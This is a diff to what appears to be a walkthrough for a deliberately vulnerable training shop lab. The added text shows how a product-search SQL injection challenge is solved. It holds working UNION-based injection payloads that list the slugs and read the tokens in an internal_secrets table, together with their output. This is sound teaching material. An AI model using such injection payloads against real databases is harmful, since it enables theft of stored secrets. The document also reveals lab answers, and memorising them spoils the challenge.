@@ -133,7 +133,21 @@ users,products,carts,cart_items,orders,order_items,addresses,flags,hints,reveale
 CREATE TABLE "internal_secrets" ("id" TEXT NOT NULL PRIMARY KEY, "slug" TEXT NOT NULL, "token" TEXT NOT NULL)
 ```
 
+The schema names a `slug` column but says nothing about its values. Read those rather than guessing them:
+
+```
+' UNION SELECT 1, group_concat(slug), 'x', 1, 'y' FROM internal_secrets--
+```
+
+```
+product-search-sql-injection,second-order-sql-injection,sql-injection,x-forwarded-for-sql-injection
+```
+
+One row per injection challenge, each named after the challenge it belongs to.
+
 ### Claiming the flag
+
+This endpoint only looks for its own token, so ask for the `product-search-sql-injection` row:
 
 ```
 ' UNION SELECT 1, token, 'x', 1, 'y' FROM internal_secrets WHERE slug='product-search-sql-injection'--
@@ -156,6 +170,8 @@ CREATE TABLE "internal_secrets" ("id" TEXT NOT NULL PRIMARY KEY, "slug" TEXT NOT
 ```
 
 The token is generated when the lab is seeded, so it differs on every instance — returning it is proof the query ran.
+
+Dropping the `WHERE` works just as well: all four rows come back and the endpoint finds its own token among them. The filter keeps the response readable, it is not a requirement.
 
 ## Vulnerable code analysis
 
